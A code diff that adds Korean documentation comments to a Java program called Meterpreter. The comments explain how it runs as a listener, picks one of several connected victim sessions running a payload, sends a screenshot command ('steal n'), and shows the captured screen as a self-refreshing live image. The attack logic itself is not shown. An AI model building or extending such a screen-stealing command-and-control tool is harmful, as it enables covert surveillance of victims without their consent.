@@ -13,6 +13,11 @@ import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 
+/**
+ * Meterpreter 프로젝트 내부에서 사용될 설정변수 등 공유자원
+ * @author root
+ *
+ */
 abstract class pRes {
 
 	public static final String IMG_NAME = "live.jpg";
@@ -25,11 +30,24 @@ abstract class pRes {
 	public static final int LISTEN_PORT = 17201;
 }
 
+/**
+ * 소켓 통신간 규약
+ * @author root
+ *
+ */
 abstract class Cmd {
 
 	public static final String TAKE_SCREEN_SHOT = "TSS";
 }
 
+/**
+ * 연결된 세션에 TAKE_SCREEN_SHOT 명령을 보내 해당 세션의 이미지를 받아온다
+ * 받아온 이미지는 pRes.IMG_NAME의 이름으로 로컬 디렉토리에 저장된다
+ * 최초 할당 시 html 파일이 생성되며 해당파일을 브라우저에서 열면
+ * 이미지 파일을 일정 주기로 새로고침해주어 마치 라이브로 연결된 세션의 모습을 보는듯 하게 해준다
+ * @author root
+ *
+ */
 class Commander {
 
 	private BufferedReader br;
@@ -75,6 +93,16 @@ class Commander {
 		}
 	}
 
+	/**
+	 * 연결된 세션에게 커맨드를 전송한다
+	 * 페이로드를 싱행중인 세션은 커맨드 수신시 자신의 화면을 캡쳐한 데이터를 송신하게 되며
+	 * Meterpreter에서의 수신은 Receiver클래스가 그 역할을 한다
+	 * 
+	 * @param dos
+	 * Meterpreter 작동방식이 연결된 세션중 한 세션을 선택해
+	 * 그 세션으로부터 지속적인 이미지를 수신하는 방식이기에
+	 * 해당 세션에 대한 DataOutputStream을 인자로 받아 해당 세션과만의 통신을 보장한다
+	 */
 	public void command(DataOutputStream dos) {
 
 		System.out.println("Press 'e' to interrupt stealing.\n");
@@ -108,6 +136,13 @@ class Commander {
 	}
 }
 
+/**
+ * Commander에서 세션에게 커맨드를 보낸다면 해당 세션은 이미지를 Meterpreter에게 송신하게 되고
+ * 해당 이미지는 Receiver 클래스에서 수신하고 저장하게 된다
+ * 세션 최초 연결 시 각 세션에는 각 1개의 Receiver가 초기화되서 돌아가게 된다
+ * @author root
+ *
+ */
 class Receiver {
 
 	private ObjectInputStream ois;
@@ -137,6 +172,18 @@ class Receiver {
 	}
 }
 
+/**
+ * Payload 실행 시 Meterpreter에 연결된 세션을 관리하는 클래스이다
+ * 커맨드 전송을 위한 OutputStream과 이미지 수신을 위한 InputStream을 지니고 있고
+ * 해당 객체에 대한 getter, setter을 가지고 있어
+ * 접속된 여러개의 세션 중 원하는 세션을 골라 해당 세션에게 커맨드를 전송할 수 있게 해준다
+ * 세션은 pRes.sessionList에서 공유자원으로서 관리된다
+ * 
+ * 모든 세션이 초기화 됨과 동시에 한개의 스레드에 할당되고
+ * 하나의 Receiver가 동작해 각 세션마다 커맨드 송신으로부터 오는 이미지의 수신을 대기하게 된다
+ * @author root
+ *
+ */
 class Session implements Runnable {
 
 	private String ip;
@@ -194,6 +241,15 @@ class Session implements Runnable {
 	}
 }
 
+/**
+ * 사용자 인터페이스를 위한 IO 클래스
+ * 사용할 수 있는 명령어는 다음과 같다
+ * 1. sessions : 현재 연결중인 세션을 확인한다. 접속중인 세션이 없을 시 표시되지 않는다.
+ * 2. steal n : 현재 연결중인 세션에게 커맨드를 보내 세션의 화면을 모니터링하기 시작한다. e로 중지할 수 있다
+ * 3. exit, quit : 프로그램을 종료한다
+ * @author root
+ *
+ */
 class IO {
 
 	private BufferedReader br;
@@ -277,6 +333,11 @@ class IO {
 	}
 }
 
+/**
+ * 엔트리 클래스, Meterpreter의 초기화 가능여부를 판단해 실행가능상태인 경우만 실행한다
+ * @author root
+ *
+ */
 public class Meterpreter {
 
 	public static void main(String[] args) {
